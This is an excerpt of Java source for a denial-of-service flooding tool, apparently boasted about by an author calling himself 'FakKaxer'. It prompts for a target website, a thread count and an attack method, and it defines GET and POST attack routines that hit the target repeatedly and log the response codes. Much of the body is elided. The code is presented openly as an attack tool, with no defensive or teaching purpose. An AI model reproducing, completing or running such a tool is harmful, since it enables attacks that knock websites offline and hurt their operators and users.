...
public class Dos implements Runnable {
    ...
    public static void main(String[] args) throws Exception {
        ...
        url = in.nextLine();
        System.out.println("\n");
        System.out.println("FakKaxer: STARTING ATTACK TO WEBSITE: " + url);

        String[] SUrl = url.split("://");

        System.out.println("THIS DOS/DDOS TOOL IS CREATED BY FakKaxer");
        ...
        System.out.println("TOOL DOS/DDOS BY HACKER: FakKaxer");

        System.out.print("THREAD TO ATTACK: ");
        ...
        System.out.print("METHOD TO ATTACK: ");
        ...
        System.out.println("STARTING ATTACK TO WEBSITE");
    ...
    private void postAttack(String url) throws Exception {
        ...
        wr.close();
        int responseCode = con.getResponseCode();
        System.out.println("FakKaxer: POST ATTACKED!: " + responseCode + "Thread: " + this.seq);
    }
    ...
    private void getAttack(String url) throws Exception {
        ...
        int responseCode = con.getResponseCode();
        System.out.println("FakKaxer: GET ATTACKED!: " + responseCode + "Thread: " + this.seq);
    }
